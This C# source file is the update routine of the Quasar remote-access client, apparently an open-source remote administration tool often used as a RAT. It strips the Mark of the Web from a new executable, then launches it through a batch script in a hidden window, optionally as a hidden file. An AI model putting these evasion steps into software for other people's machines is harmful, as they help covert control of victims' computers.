using System;
using System.Diagnostics;
using System.IO;
using Quasar.Client.Config;
using Quasar.Client.Core.Helper;
using Quasar.Client.Core.Utilities;
using Quasar.Common.Messages;

namespace Quasar.Client.Core.Installation
{
    public static class ClientUpdater
    {
        public static void Update(Networking.Client client, string newFilePath)
        {
            try
            {
                FileHelper.DeleteZoneIdentifier(newFilePath);

                var bytes = File.ReadAllBytes(newFilePath);
                if (!FileHelper.IsValidExecuteableFile(bytes))
                    throw new Exception("no pe file");

                string batchFile = FileHelper.CreateUpdateBatch(newFilePath, Settings.INSTALL && Settings.HIDEFILE);

                if (string.IsNullOrEmpty(batchFile))
                    throw new Exception("Could not create update batch file.");

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);

                if (Settings.STARTUP)
                    Startup.RemoveFromStartup();

                Program.ConnectClient.Exit();
            }
            catch (Exception ex)
            {
                NativeMethods.DeleteFile(newFilePath);
                client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
            }
        }
    }
}
